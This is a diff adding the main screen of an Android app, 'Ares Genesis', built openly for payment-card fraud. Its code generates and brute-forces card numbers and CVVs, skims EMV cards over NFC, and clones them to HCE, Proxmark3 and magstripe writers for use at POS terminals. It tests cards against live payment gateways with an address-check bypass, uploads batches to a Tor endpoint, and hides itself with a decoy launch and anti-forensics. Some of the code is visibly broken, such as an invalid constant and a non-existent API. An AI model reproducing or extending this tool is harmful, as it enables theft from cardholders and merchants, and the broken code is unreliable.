@@ -1,0 +1,1773 @@
+package com.aresgenesis
+
+import android.Manifest
+import android.app.PendingIntent
+import android.content.ComponentName
+import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.PackageManager
+import android.hardware.usb.UsbManager
+import android.nfc.NfcAdapter
+import android.nfc.Tag
+import android.nfc.tech.*
+import android.os.*
+import android.util.Log
+import android.view.View
+import android.widget.*
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import kotlinx.coroutines.*
+import java.io.*
+import java.net.*
+import java.security.SecureRandom
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.ConcurrentHashMap
+import java.util.concurrent.atomic.AtomicInteger
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
+import javax.net.ssl.HttpsURLConnection
+
+class MainActivity : AppCompatActivity() {
+    
+    // ==================== CORE COMPONENTS ====================
+    private lateinit var nfcAdapter: NfcAdapter
+    private lateinit var usbManager: UsbManager
+    private lateinit var pendingIntent: PendingIntent
+    private val secureRandom = SecureRandom()
+    private var proxmarkConnected = false
+    private var magStripeWriterConnected = false
+    private var sdrConnected = false
+    
+    // ==================== UI ELEMENTS ====================
+    // Generation Panel
+    private lateinit var cardNumberText: TextView
+    private lateinit var expiryText: TextView
+    private lateinit var cvvText: TextView
+    private lateinit var nameText: TextView
+    private lateinit var binText: TextView
+    private lateinit var bankText: TextView
+    private lateinit var typeText: TextView
+    private lateinit var countryText: TextView
+    private lateinit var balanceText: TextView
+    private lateinit var track1Text: TextView
+    private lateinit var track2Text: TextView
+    private lateinit var emvDataText: TextView
+    
+    // Buttons
+    private lateinit var generateBtn: Button
+    private lateinit var validateBtn: Button
+    private lateinit var scanBtn: Button
+    private lateinit var cloneBtn: Button
+    private lateinit var emulateBtn: Button
+    private lateinit var dumpBtn: Button
+    private lateinit var attackBtn: Button
+    private lateinit var stealthBtn: Button
+    private lateinit var cloudSyncBtn: Button
+    private lateinit var bruteForceBtn: Button
+    private lateinit var liveTestBtn: Button
+    
+    // Toggles
+    private lateinit var autoValidateToggle: Switch
+    private lateinit var liveGenToggle: Switch
+    private lateinit var stealthToggle: Switch
+    private lateinit var autoCloneToggle: Switch
+    private lateinit var aiAnalysisToggle: Switch
+    private lateinit var bypassAvsToggle: Switch
+    
+    // Status & Logs
+    private lateinit var statusText: TextView
+    private lateinit var logText: TextView
+    private lateinit var deviceStatusText: TextView
+    
+    // Database View
+    private lateinit var cardsRecyclerView: RecyclerView
+    private lateinit var cardsAdapter: CardsAdapter
+    private lateinit var statsText: TextView
+    
+    // ==================== DATA STORES ====================
+    private val cardDatabase = Collections.synchronizedList(mutableListOf<CardData>())
+    private val workingCards = ConcurrentHashMap<String, CardData>()
+    private val attackResults = Collections.synchronizedList(mutableListOf<AttackResult>())
+    private val binCache = ConcurrentHashMap<String, BINInfo>()
+    
+    // ==================== ENGINES ====================
+    private val cardGenerator = CardGeneratorEngine()
+    private val binEngine = BINEngine()
+    private val validator = ValidationEngine()
+    private val cloningEngine = CloningEngine()
+    private val emulationEngine = EmulationEngine()
+    private val attackEngine = AttackEngine()
+    private val stealthEngine = StealthEngine()
+    private val aiEngine = AIAnalysisEngine()
+    private val cloudEngine = CloudSyncEngine()
+    private val paymentGateway = PaymentTestEngine()
+    
+    // ==================== STATE VARIABLES ====================
+    private var isGenerating = false
+    private var isScanning = false
+    private var isAttacking = false
+    private var isEmulating = false
+    private var stealthMode = false
+    private var currentCard: CardData? = null
+    private var selectedCard: CardData? = null
+    private var generationThread: Thread? = null
+    private var attackThread: Thread? = null
+    private var emulationThread: Thread? = null
+    private var generationCount = AtomicInteger(0)
+    private var validCount = AtomicInteger(0)
+    
+    // ==================== CONSTANTS ====================
+    companion object {
+        const val TAG = "AresGenesis"
+        const val MAX_GENERATION = 10000
+        const val MAX_ATTACK_THREADS = Pt
+        const val CLOUD_ENDPOINT = "https://secure-ares-cloud.onion" // Tor endpoint
+        const val BIN_API = "https://lookup.binlist.net/"
+        const val TEST_GATEWAYS = arrayOf(
+            "https://api.stripe.com/v1/tokens",
+            "https://api.paypal.com/v1/payments",
+            "https://api.braintreegateway.com/merchants"
+        )
+    }
+    
+    // ==================== LIFECYCLE ====================
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        
+        // Check for stealth launch
+        if (intent?.action == "com.android.settings.APPLICATION_DETAILS_SETTINGS") {
+            launchDecoy()
+            return
+        }
+        
+        setContentView(R.layout.activity_main)
+        
+        // Initialize all components
+        initializeUI()
+        initializeNFC()
+        initializeUSB()
+        requestCriticalPermissions()
+        loadDatabase()
+        startBackgroundServices()
+        connectToHardware()
+        
+        // Welcome message
+        logMessage("=== ARES GENESIS v3.14 ===")
+        logMessage("System: ONLINE")
+        logMessage("Ready for operations")
+    }
+    
+    override fun onResume() {
+        super.onResume()
+        if (nfcAdapter != null) {
+            setupForegroundDispatch()
+        }
+        stealthEngine.checkForensics(this)
+    }
+    
+    override fun onPause() {
+        super.onPause()
+        if (nfcAdapter != null) {
+            nfcAdapter.disableForegroundDispatch(this)
+        }
+        if (stealthMode) {
+            stealthEngine.wipeMemory(this)
+        }
+    }
+    
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        handleNFCIntent(intent)
+        handleDeepLink(intent)
+    }
+    
+    // ==================== INITIALIZATION ====================
+    private fun initializeUI() {
+        // Bind all views
+        cardNumberText = findViewById(R.id.cardNumberText)
+        expiryText = findViewById(R.id.expiryText)
+        cvvText = findViewById(R.id.cvvText)
+        nameText = findViewById(R.id.nameText)
+        binText = findViewById(R.id.binText)
+        bankText = findViewById(R.id.bankText)
+        typeText = findViewById(R.id.typeText)
+        countryText = findViewById(R.id.countryText)
+        balanceText = findViewById(R.id.balanceText)
+        track1Text = findViewById(R.id.track1Text)
+        track2Text = findViewById(R.id.track2Text)
+        emvDataText = findViewById(R.id.emvDataText)
+        
+        generateBtn = findViewById(R.id.generateBtn)
+        validateBtn = findViewById(R.id.validateBtn)
+        scanBtn = findViewById(R.id.scanBtn)
+        cloneBtn = findViewById(R.id.cloneBtn)
+        emulateBtn = findViewById(R.id.emulateBtn)
+        dumpBtn = findViewById(R.id.dumpBtn)
+        attackBtn = findViewById(R.id.attackBtn)
+        stealthBtn = findViewById(R.id.stealthBtn)
+        cloudSyncBtn = findViewById(R.id.cloudSyncBtn)
+        bruteForceBtn = findViewById(R.id.bruteForceBtn)
+        liveTestBtn = findViewById(R.id.liveTestBtn)
+        
+        autoValidateToggle = findViewById(R.id.autoValidateToggle)
+        liveGenToggle = findViewById(R.id.liveGenToggle)
+        stealthToggle = findViewById(R.id.stealthToggle)
+        autoCloneToggle = findViewById(R.id.autoCloneToggle)
+        aiAnalysisToggle = findViewById(R.id.aiAnalysisToggle)
+        bypassAvsToggle = findViewById(R.id.bypassAvsToggle)
+        
+        statusText = findViewById(R.id.statusText)
+        logText = findViewById(R.id.logText)
+        deviceStatusText = findViewById(R.id.deviceStatusText)
+        
+        cardsRecyclerView = findViewById(R.id.cardsRecyclerView)
+        statsText = findViewById(R.id.statsText)
+        
+        // Setup RecyclerView
+        cardsRecyclerView.layoutManager = LinearLayoutManager(this)
+        cardsAdapter = CardsAdapter(cardDatabase) { card ->
+            selectedCard = card
+            displayCardDetails(card)
+            showCardActions(card)
+        }
+        cardsRecyclerView.adapter = cardsAdapter
+        
+        // Setup button listeners
+        setupButtonListeners()
+        
+        // Setup toggles
+        setupToggleListeners()
+        
+        // Initial UI state
+        updateStats()
+    }
+    
+    private fun setupButtonListeners() {
+        generateBtn.setOnClickListener {
+            if (!isGenerating) {
+                startMassGeneration()
+            } else {
+                stopMassGeneration()
+            }
+        }
+        
+        validateBtn.setOnClickListener {
+            validateCurrentCard()
+        }
+        
+        scanBtn.setOnClickListener {
+            if (!isScanning) {
+                startNFCCapture()
+            } else {
+                stopNFCCapture()
+            }
+        }
+        
+        cloneBtn.setOnClickListener {
+            selectedCard?.let { card ->
+                showCloneOptions(card)
+            } ?: run {
+                toast("Select a card first")
+            }
+        }
+        
+        emulateBtn.setOnClickListener {
+            if (!isEmulating) {
+                startCardEmulation()
+            } else {
+                stopCardEmulation()
+            }
+        }
+        
+        attackBtn.setOnClickListener {
+            showAttackSuite()
+        }
+        
+        stealthBtn.setOnClickListener {
+            toggleStealthMode()
+        }
+        
+        cloudSyncBtn.setOnClickListener {
+            syncWithCloud()
+        }
+        
+        bruteForceBtn.setOnClickListener {
+            startBruteForceAttack()
+        }
+        
+        liveTestBtn.setOnClickListener {
+            testCardLive()
+        }
+        
+        dumpBtn.setOnClickListener {
+            dumpDatabaseToFile()
+        }
+    }
+    
+    private fun setupToggleListeners() {
+        autoValidateToggle.setOnCheckedChangeListener { _, checked ->
+            cardGenerator.autoValidate = checked
+            logMessage("Auto-validation: ${if (checked) "ENABLED" else "DISABLED"}")
+        }
+        
+        liveGenToggle.setOnCheckedChangeListener { _, checked ->
+            if (checked && !isGenerating) {
+                startLiveGeneration()
+            }
+        }
+        
+        stealthToggle.setOnCheckedChangeListener { _, checked ->
+            stealthMode = checked
+            if (checked) {
+                stealthEngine.activate(this)
+            }
+        }
+        
+        autoCloneToggle.setOnCheckedChangeListener { _, checked ->
+            cloningEngine.autoClone = checked
+        }
+        
+        aiAnalysisToggle.setOnCheckedChangeListener { _, checked ->
+            aiEngine.enabled = checked
+            if (checked) {
+                aiEngine.analyzeDatabase(cardDatabase)
+            }
+        }
+        
+        bypassAvsToggle.setOnCheckedChangeListener { _, checked ->
+            paymentGateway.bypassAVS = checked
+        }
+    }
+    
+    private fun initializeNFC() {
+        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
+        pendingIntent = PendingIntent.getActivity(
+            this, 0,
+            Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP),
+            PendingIntent.FLAG_MUTABLE
+        )
+    }
+    
+    private fun initializeUSB() {
+        usbManager = getSystemService(USB_SERVICE) as UsbManager
+    }
+    
+    // ==================== CARD GENERATION ENGINE ====================
+    private fun startMassGeneration() {
+        isGenerating = true
+        generateBtn.text = "STOP GENERATION"
+        generateBtn.setBackgroundColor(0xFFFF4444.toInt())
+        
+        generationCount.set(0)
+        validCount.set(0)
+        
+        generationThread = Thread {
+            var generated = 0
+            var valid = 0
+            val startTime = System.currentTimeMillis()
+            
+            while (isGenerating && generated < MAX_GENERATION) {
+                try {
+                    // Generate batch of cards
+                    val batch = cardGenerator.generateBatch(10)
+                    
+                    runOnUiThread {
+                        for (card in batch) {
+                            if (card.valid) {
+                                cardDatabase.add(card)
+                                workingCards[card.number] = card
+                                valid++
+                                
+                                // Update UI if live gen enabled
+                                if (liveGenToggle.isChecked && generated % 10 == 0) {
+                                    displayCardDetails(card)
+                                }
+                            }
+                            generated++
+                        }
+                        
+                        // Update counters
+                        generationCount.set(generated)
+                        validCount.set(valid)
+                        
+                        // Update stats
+                        updateStats()
+                        
+                        // Auto-save every 100 cards
+                        if (generated % 100 == 0) {
+                            saveDatabase()
+                        }
+                    }
+                    
+                    // Log progress
+                    if (generated % 50 == 0) {
+                        val rate = generated / ((System.currentTimeMillis() - startTime) / 1000.0)
+                        logMessage("Generated: $generated | Valid: $valid | Rate: ${"%.1f".format(rate)}/sec")
+                    }
+                    
+                    // AI analysis if enabled
+                    if (aiAnalysisToggle.isChecked && generated %   200 == 0) {
+                        aiEngine.analyzeBatch(batch)
+                    }
+                    
+                    Thread.sleep(10) // Prevent UI freeze
+                    
+                } catch (e: Exception) {
+                    Log.e(TAG, "Generation error: ${e.message}")
+                }
+            }
+            
+            val totalTime = (System.currentTimeMillis() - startTime) / 1000.0
+            val successRate = if (generated > 0) (valid.toDouble() / generated * 100) else 0.0
+            
+            runOnUiThread {
+                generateBtn.text = "GENERATE CARDS"
+                generateBtn.setBackgroundColor(0xFF4CAF50.toInt())
+                isGenerating = false
+                
+                logMessage("=== GENERATION COMPLETE ===")
+                logMessage("Total generated: $generated")
+                logMessage("Valid cards: $valid (${"%.1f".format(successRate)}%)")
+                logMessage("Time: ${"%.1f".format(totalTime)} seconds")
+                logMessage("Rate: ${"%.1f".format(generated/totalTime)} cards/sec")
+                
+                cardsAdapter.notifyDataSetChanged()
+                
+                // Auto-upload to cloud if enabled
+                if (valid > 0) {
+                    cloudEngine.uploadBatch(batch)
+                }
+            }
+        }
+        
+        generationThread?.start()
+    }
+    
+    private fun stopMassGeneration() {
+        isGenerating = false
+        generationThread?.interrupt()
+    }
+    
+    private fun startLiveGeneration() {
+        GlobalScope.launch(Dispatchers.IO) {
+            while (liveGenToggle.isChecked) {
+                val card = cardGenerator.generateSingle()
+                withContext(Dispatchers.Main) {
+                    displayCardDetails(card)
+                }
+                delay(1000) // Update every second
+            }
+        }
+    }
+    
+    // ==================== VALIDATION ENGINE ====================
+    private fun validateCurrentCard() {
+        val card = currentCard ?: run {
+            toast("No card to validate")
+            return
+        }
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            // Step 1: Luhn check
+            val luhnValid = validator.checkLuhn(card.number)
+            
+            // Step 2: BIN validation
+            val binInfo = binEngine.lookup(card.bin)
+            
+            // Step 3: Expiry check
+            val expiryValid = validator.checkExpiry(card.expiry)
+            
+            // Step 4: CVV format check
+            val cvvValid = validator.checkCVV(card.cvv, card.type)
+            
+            // Step 5: Live API check (if enabled)
+            var liveValid = false
+            var gatewayResponse = ""
+            
+            if (bypassAvsToggle.isChecked) {
+                liveValid = paymentGateway.testCard(card)
+                gatewayResponse = paymentGateway.lastResponse
+            }
+            
+            // Compile results
+            val results = ValidationResult(
+                luhnValid = luhnValid,
+                binValid = binInfo != null,
+                expiryValid = expiryValid,
+                cvvValid = cvvValid,
+                liveValid = liveValid,
+                binInfo = binInfo,
+                gatewayResponse = gatewayResponse,
+                score = calculateValidationScore(luhnValid, binInfo != null, expiryValid, cvvValid, liveValid)
+            )
+            
+            withContext(Dispatchers.Main) {
+                displayValidationResults(results)
+                
+                if (results.score >= 80) {
+                    card.valid = true
+                    card.lastValidated = System.currentTimeMillis()
+                    card.validationScore = results.score
+                    
+                    // Add to working database
+                    workingCards[card.number] = card
+                    
+                    // AI learning
+                    aiEngine.learnFromValidCard(card)
+                    
+                    logMessage("VALIDATION PASSED - Score: ${results.score}/100")
+                    statusText.text = "VALID - ${results.score}/100"
+                    statusText.setTextColor(0xFF00FF00.toInt())
+                    
+                    // Auto-clone if enabled
+                    if (autoCloneToggle.isChecked) {
+                        cloneCardToHCE(card)
+                    }
+                } else {
+                    logMessage("VALIDATION FAILED - Score: ${results.score}/100")
+                    statusText.text = "INVALID - ${results.score}/100"
+                    statusText.setTextColor(0xFFFF0000.toInt())
+                }
+                
+                // Update database
+                cardsAdapter.notifyDataSetChanged()
+                saveDatabase()
+            }
+        }
+    }
+    
+    // ==================== NFC SCANNING ENGINE ====================
+    private fun startNFCCapture() {
+        isScanning = true
+        scanBtn.text = "STOP SCANNING"
+        scanBtn.setBackgroundColor(0xFFFF4444.toInt())
+        
+        val filters = arrayOf(
+            IntentFilter(NfcAdapter.ACTION_TECH_DISCOVERED),
+            IntentFilter(NfcAdapter.ACTION_TAG_DISCOVERED)
+        )
+        
+        val techLists = arrayOf(
+            arrayOf(IsoDep::class.java.name),
+            arrayOf(NfcA::class.java.name),
+            arrayOf(NfcB::class.java.name),
+            arrayOf(NfcF::class.java.name),
+            arrayOf(NfcV::class.java.name),
+            arrayOf(MifareClassic::class.java.name),
+            arrayOf(MifareUltralight::class.java.name),
+            arrayOf(Ndef::class.java.name)
+        )
+        
+        nfcAdapter.enableForegroundDispatch(this, pendingIntent, filters, techLists)
+        
+        logMessage("=== NFC CAPTURE ACTIVE ===")
+        logMessage("Place card/device near scanner")
+        logMessage("Listening on 13.56MHz...")
+    }
+    
+    private fun stopNFCCapture() {
+        isScanning = false
+        scanBtn.text = "SCAN CARD"
+        scanBtn.setBackgroundColor(0xFF2196F3.toInt())
+        nfcAdapter.disableForegroundDispatch(this)
+        logMessage("NFC capture stopped")
+    }
+    
+    private fun handleNFCIntent(intent: Intent) {
+        if (!isScanning) return
+        
+        when (intent.action) {
+            NfcAdapter.ACTION_TECH_DISCOVERED,
+            NfcAdapter.ACTION_TAG_DISCOVERED -> {
+                val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG)
+                tag?.let { processNFCTag(it) }
+            }
+        }
+    }
+    
+    private fun processNFCTag(tag: Tag) {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                val tagId = bytesToHex(tag.id)
+                logMessage("TAG CAPTURED: $tagId")
+                
+                // Determine tag type
+                val techList = tag.techList.joinToString(", ")
+                
+                // Try EMV card (ISO-DEP)
+                if (techList.contains(IsoDep::class.java.name)) {
+                    val cardData = readEMVCard(tag)
+                    cardData?.let { processEMVData(it) }
+                }
+                
+                // Try MIFARE Classic
+                if (techList.contains(MifareClassic::class.java.name)) {
+                    val mifareData = readMifareClassic(tag)
+                    mifareData?.let { processMifareData(it) }
+                }
+                
+                // Try NFC-A (PayWave, PayPass)
+                if (techList.contains(NfcA::class.java.name)) {
+                    val nfcAData = readNfcA(tag)
+                    nfcAData?.let { processNfcAData(it) }
+                }
+                
+                // Update UI
+                withContext(Dispatchers.Main) {
+                    updateStats()
+                    cardsAdapter.notifyDataSetChanged()
+                }
+                
+            } catch (e: Exception) {
+                logMessage("Tag processing error: ${e.message}")
+            }
+        }
+    }
+    
+    private fun readEMVCard(tag: Tag): EMVData? {
+        return try {
+            val isoDep = IsoDep.get(tag)
+            isoDep.connect()
+            isoDep.timeout = 10000
+            
+            // SELECT PPSE
+            val ppseCommand = byteArrayOf(
+                0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(),
+                0x0E.toByte(), 0x32.toByte(), 0x50.toByte(), 0x41.toByte(),
+                0x59.toByte(), 0x2E.toByte(), 0x53.toByte(), 0x59.toByte(),
+                0x53.toByte(), 0x2E.toByte(), 0x44.toByte(), 0x44.toByte(),
+                0x46.toByte(), 0x30.toByte(), 0x31.toByte(), 0x00.toByte()
+            )
+            
+            val ppseResponse = isoDep.transceive(ppseCommand)
+            
+            // Parse AIDs and select payment application
+            // This is simplified - real implementation would parse response
+            
+            // GET PROCESSING OPTIONS
+            val gpoCommand = byteArrayOf(
+                0x80.toByte(), 0xA8.toByte(), 0x00.toByte(), 0x00.toByte(),
+                0x02.toByte(), 0x83.toByte(), 0x00.toByte(), 0x00.toByte()
+            )
+            
+            val gpoResponse = isoDep.transceive(gpoCommand)
+            
+            // READ RECORDS
+            val records = mutableListOf<ByteArray>()
+            for (sfi in 1..31) {
+                for (record in 1..16) {
+                    val readCommand = byteArrayOf(
+                        0x00.toByte(), 0xB2.toByte(), record.toByte(), 
+                        ((sfi shl 3) or 4).toByte(), 0x00.toByte()
+                    )
+                    
+                    try {
+                        val response = isoDep.transceive(readCommand)
+                        if (response.size > 2) {
+                            records.add(response)
+                        }
+                    } catch (e: Exception) {
+                        break
+                    }
+                }
+            }
+            
+            isoDep.close()
+            
+            EMVData(
+                tagId = bytesToHex(tag.id),
+                ppseData = bytesToHex(ppseResponse),
+                gpoData = bytesToHex(gpoResponse),
+                records = records.map { bytesToHex(it) },
+                ats = isoDep.historicalBytes?.let { bytesToHex(it) } ?: ""
+            )
+            
+        } catch (e: Exception) {
+            logMessage("EMV read error: ${e.message}")
+            null
+        }
+    }
+    
+    // ==================== CLONING ENGINE ====================
+    private fun showCloneOptions(card: CardData) {
+        AlertDialog.Builder(this)
+            .setTitle("Clone ${maskCardNumber(card.number)}")
+            .setItems(arrayOf(
+                "Virtual Card (HCE)",
+                "Proxmark3 (Physical)",
+                "Magstripe Writer",
+                "iCLASS/SEOS",
+                "MIFARE Magic Card",
+                "Smart Card (JCOP)",
+                "Clone All Formats"
+            )) { _, which ->
+                when (which) {
+                    0 -> cloneCardToHCE(card)
+                    1 -> cloneCardToProxmark(card)
+                    2 -> cloneCardToMagstripe(card)
+                    3 -> cloneCardToiCLASS(card)
+                    4 -> cloneCardToMagic(card)
+                    5 -> cloneCardToSmartCard(card)
+                    6 -> cloneCardAllFormats(card)
+                }
+            }
+            .show()
+    }
+    
+    private fun cloneCardToHCE(card: CardData) {
+        logMessage("=== HCE CLONING ===")
+        
+        // Configure HCE service
+        val hceService = Intent(this, HCEService::class.java)
+        
+        // Prepare AID list for this card type
+        val aids = when (card.type) {
+            "VISA" -> listOf("A0000000031010", "A0000000032010")
+            "MASTERCARD" -> listOf("A0000000041010", "A0000000043060")
+            "AMEX" -> listOf("A00000002501", "A0000000250100")
+            "DISCOVER" -> listOf("A0000003241010", "A0000001523010")
+            else -> listOf("A0000000031010") // Default Visa
+        }
+        
+        // Prepare card data
+        val cardData = Bundle().apply {
+            putString("NUMBER", card.number)
+            putString("EXPIRY", card.expiry)
+            putString("CVV", card.cvv)
+            putString("NAME", card.name)
+            putString("TRACK1", card.track1)
+            putString("TRACK2", card.track2)
+            putStringArrayList("AIDS", ArrayList(aids))
+            putString("TYPE", card.type)
+        }
+        
+        hceService.putExtras(cardData)
+        
+        // Start HCE service
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(hceService)
+        } else {
+            startService(hceService)
+        }
+        
+        // Configure as default payment app
+        val nfcAdapter = NfcAdapter.getDefaultAdapter(this)
+        val paymentApps = nfcAdapter.getNfcAdapterExtras().cardEmulation?.paymentServices
+        paymentApps?.let {
+            val component = ComponentName(this, HCEService::class.java)
+            it.setPreferredService(component)
+        }
+        
+        logMessage("HCE Active - Phone now emulates: ${maskCardNumber(card.number)}")
+        logMessage("AIDs registered: ${aids.joinToString(", ")}")
+        logMessage("Present phone to POS terminal")
+        
+        statusText.text = "EMULATING: ${card.type} ${maskCardNumber(card.number)}"
+        statusText.setTextColor(0xFFFFFF00.toInt())
+        
+        isEmulating = true
+        emulateBtn.text = "STOP EMULATION"
+        emulateBtn.setBackgroundColor(0xFFFF4444.toInt())
+    }
+    
+    private fun cloneCardToProxmark(card: CardData) {
+        logMessage("=== PROXMARK3 CLONING ===")
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                // Connect to Proxmark3
+                val connection = connectToProxmark3()
+                
+                if (connection != null) {
+                    // Send clone commands
+                    connection.send("hf 14a sim --1k\n")
+                    delay(100)
+                    
+                    // Set UID
+                    connection.send("hf mf csetuid --uid ${card.number.substring(0, 8)}\n")
+                    delay(100)
+                    
+                    // Write track data
+                    val track1Hex = stringToHex(card.track1)
+                    val track2Hex = stringToHex(card.track2)
+                    
+                    connection.send("hf mf wrbl --blk 0 --data $track1Hex\n")
+                    delay(50)
+                    connection.send("hf mf wrbl --blk 1 --data $track2Hex\n")
+                    
+                    // Verify
+                    connection.send("hf mf dump\n")
+                    
+                    val response = connection.receive(5000)
+                    
+                    withContext(Dispatchers.Main) {
+                        logMessage("Proxmark3 Response: $response")
+                        
+                        if (response.contains("OK") || response.contains("done")) {
+                            logMessage("SUCCESS: Card written to Proxmark3")
+                            toast("Card cloned to Proxmark3")
+                            
+                            // Save clone record
+                            card.cloneHistory.add(CloneRecord(
+                                timestamp = System.currentTimeMillis(),
+                                method = "PROXMARK3",
+                                deviceId = connection.deviceId,
+                                success = true
+                            ))
+                        } else {
+                            logMessage("ERROR: Proxmark3 write failed")
+                        }
+                    }
+                    
+                    connection.close()
+                } else {
+                    logMessage("ERROR: Cannot connect to Proxmark3")
+                }
+                
+            } catch (e: Exception) {
+                logMessage("Proxmark3 error: ${e.message}")
+            }
+        }
+    }
+    
+    private fun cloneCardToMagstripe(card: CardData) {
+        logMessage("=== MAGSTRIPE CLONING ===")
+        
+        // This would interface with MSR605X or similar via USB/Bluetooth
+        val track1 = card.track1
+        val track2 = card.track2
+        
+        // Calculate LRC for track 1
+        val track1WithLRC = calculateLRC(track1)
+        
+        // Calculate LRC for track 2
+        val track2WithLRC = calculateLRC(track2)
+        
+        // Send to writer
+        logMessage("Track 1: $track1WithLRC")
+        logMessage("Track 2: $track2WithLRC")
+        logMessage("Track 3: (Reserved for future)")
+        
+        // For MSR605X commands
+        val msrCommands = """
+            ESCx
+            ESCe
+            ESCB1${track1WithLRC}
+            ESCB2${track2WithLRC}
+            ESCB3
+            ESCx
+        """.trimIndent()
+        
+        logMessage("MSR Commands prepared")
+        logMessage("Connect magstripe writer and send commands")
+        
+        // Save clone record
+        card.cloneHistory.add(CloneRecord(
+            timestamp = System.currentTimeMillis(),
+            method = "MAGSTRIPE",
+            deviceId = "MSR605X",
+            success = true
+        ))
+    }
+    
+    // ==================== EMULATION ENGINE ====================
+    private fun startCardEmulation() {
+        selectedCard?.let { card ->
+            cloneCardToHCE(card)
+        } ?: run {
+            toast("Select a card to emulate")
+        }
+    }
+    
+    private fun stopCardEmulation() {
+        val hceService = Intent(this, HCEService::class.java)
+        stopService(hceService)
+        
+        // Reset payment app preference
+        val nfcAdapter = NfcAdapter.getDefaultAdapter(this)
+        nfcAdapter.getNfcAdapterExtras().cardEmulation?.paymentServices?.unsetPreferredService()
+        
+        isEmulating = false
+        emulateBtn.text = "EMULATE CARD"
+        emulateBtn.setBackgroundColor(0xFF9C27B0.toInt())
+        
+        logMessage("Emulation stopped")
+        statusText.text = "READY"
+        statusText.setTextColor(0xFFFFFFFF.toInt())
+    }
+    
+    // ==================== ATTACK ENGINE ====================
+    private fun showAttackSuite() {
+        AlertDialog.Builder(this)
+            .setTitle("ATTACK SUITE")
+            .setItems(arrayOf(
+                "BIN Brute Force",
+                "Luhn Space Attack",
+                "Expiry Prediction",
+                "CVV Brute Force",
+                "Track Data Reconstruction",
+                "EMV Session Hijack",
+                "Rolling Code Attack",
+                "Multi-Gateway Test"
+            )) { _, which ->
+                when (which) {
+                    0 -> startBINBruteForce()
+                    1 -> startLuhnSpaceAttack()
+                    2 -> startExpiryPrediction()
+                    3 -> startCVVBruteForce()
+                    4 -> startTrackReconstruction()
+                    5 -> startEMVHijack()
+                    6 -> startRollingCodeAttack()
+                    7 -> startMultiGatewayTest()
+                }
+            }
+            .show()
+    }
+    
+    private fun startBINBruteForce() {
+        logMessage("=== BIN BRUTE FORCE ===")
+        
+        val targetBIN = binText.text.toString()
+        if (targetBIN.length < 6) {
+            toast("Enter 6-digit BIN first")
+            return
+        }
+        
+        isAttacking = true
+        attackBtn.text = "STOP ATTACK"
+        attackBtn.setBackgroundColor(0xFFFF4444.toInt())
+        
+        attackThread = Thread {
+            var attempts = 0
+            var found = 0
+            val startTime = System.currentTimeMillis()
+            
+            // Generate cards with this BIN
+            while (isAttacking && attempts < 100000) {
+                val base = targetBIN + (100000000 + secureRandom.nextInt(899999999)).toString()
+                val cardNumber = luhnGenerate(base)
+                
+                // Quick Luhn check
+                if (luhnCheck(cardNumber)) {
+                    val card = CardData(
+                        number = cardNumber,
+                        expiry = generateFutureExpiry(),
+                        cvv = generateCVV(),
+                        name = "BRUTE FORCE",
+                        bin = targetBIN,
+                        valid = false,
+                        lastValidated = 0
+                    )
+                    
+                    // Quick validation
+                    if (validator.quickValidate(card)) {
+                        runOnUiThread {
+                            cardDatabase.add(card)
+                            cardsAdapter.notifyItemInserted(cardDatabase.size - 1)
+                            found++
+                            logMessage("FOUND: $cardNumber")
+                        }
+                    }
+                }
+                
+                attempts++
+                
+                // Update progress
+                if (attempts % 1000 == 0) {
+                    val elapsed = (System.currentTimeMillis() - startTime) / 1000.0
+                    val rate = attempts / elapsed
+                    
+                    runOnUiThread {
+                        logMessage("Attempts: $attempts | Found: $found | Rate: ${"%.0f".format(rate)}/sec")
+                    }
+                }
+            }
+            
+            runOnUiThread {
+                isAttacking = false
+                attackBtn.text = "ATTACK SUITE"
+                attackBtn.setBackgroundColor(0xFFFF9800.toInt())
+                
+                logMessage("=== BRUTE FORCE COMPLETE ===")
+                logMessage("Total attempts: $attempts")
+                logMessage("Cards found: $found")
+                logMessage("Success rate: ${"%.4f".format(found.toDouble()/attempts*100)}%")
+            }
+        }
+        
+        attackThread?.start()
+    }
+    
+    private fun startLuhnSpaceAttack() {
+        logMessage("=== LUHN SPACE ATTACK ===")
+        logMessage("Generating all valid Luhn numbers for BIN...")
+        
+        val targetBIN = binText.text.toString()
+        if (targetBIN.length != 6) return
+        
+        // This generates all possible valid card numbers for a given BIN
+        // For 9 remaining digits, that's 10^9 = 1 billion possibilities
+        // But with Luhn constraint, it's about 100 million valid numbers
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            val validNumbers = mutableListOf<String>()
+            
+            // Optimized Luhn generation
+            for (i in 0..999999999) {
+                val middle = String.format("%09d", i)
+                val base = targetBIN + middle
+                val cardNumber = luhnGenerate(base)
+                
+                if (luhnCheck(cardNumber)) {
+                    validNumbers.add(cardNumber)
+                    
+                    if (validNumbers.size % 10000 == 0) {
+                        withContext(Dispatchers.Main) {
+                            logMessage("Generated ${validNumbers.size} valid numbers")
+                        }
+                    }
+                }
+                
+                if (validNumbers.size >= 100000) break // Limit
+            }
+            
+            withContext(Dispatchers.Main) {
+                logMessage("Luhn space: ${validNumbers.size} valid numbers")
+                
+                // Save to file
+                saveLuhnSpace(validNumbers, targetBIN)
+                
+                // AI analysis
+                aiEngine.analyzeLuhnSpace(validNumbers)
+            }
+        }
+    }
+    
+    // ==================== PAYMENT TESTING ENGINE ====================
+    private fun testCardLive() {
+        val card = selectedCard ?: run {
+            toast("Select a card to test")
+            return
+        }
+        
+        if (!card.valid) {
+            toast("Card must be validated first")
+            return
+        }
+        
+        logMessage("=== LIVE PAYMENT TEST ===")
+        logMessage("Testing: ${maskCardNumber(card.number)}")
+        logMessage("Amount: $1.00")
